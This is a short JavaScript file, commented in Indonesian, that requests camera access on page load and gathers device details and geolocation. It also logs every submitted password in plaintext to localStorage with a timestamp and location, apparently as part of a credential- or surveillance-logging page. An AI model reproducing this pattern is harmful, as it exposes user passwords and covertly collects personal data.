// Fungsi untuk mendapatkan akses kamera
function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            console.log("Akses kamera diberikan");
        })
        .catch(error => {
            console.error("Gagal mengakses kamera:", error);
        });
}

// Fungsi untuk mendapatkan informasi perangkat
function getDeviceInfo() {
    let deviceInfo = {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        vendor: navigator.vendor,
        screenWidth: screen.width,
        screenHeight: screen.height
    };
    return deviceInfo;
}

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation(callback) {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            position => {
                let locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
                callback(locationData);
            },
            error => {
                console.error("Gagal mendapatkan lokasi:", error);
                callback(null);
            }
        );
    } else {
        console.error("Geolocation tidak didukung di browser ini.");
        callback(null);
    }
}

// Fungsi untuk menyimpan data login ke localStorage
function saveLoginData(password) {
    let loginData = JSON.parse(localStorage.getItem("loginData")) || [];
    let newData = {
        timestamp: new Date().toLocaleString(),
        password: password,
        device: getDeviceInfo()
    };

    getLocation(locationData => {
        if (locationData) {
            newData.location = locationData;
        }
        loginData.push(newData);
        localStorage.setItem("loginData", JSON.stringify(loginData));
    });
}

// Fungsi untuk mengambil data login dari localStorage
function getLoginData() {
    return JSON.parse(localStorage.getItem("loginData")) || [];
}

// Mulai akses kamera saat halaman dimuat
startCamera();
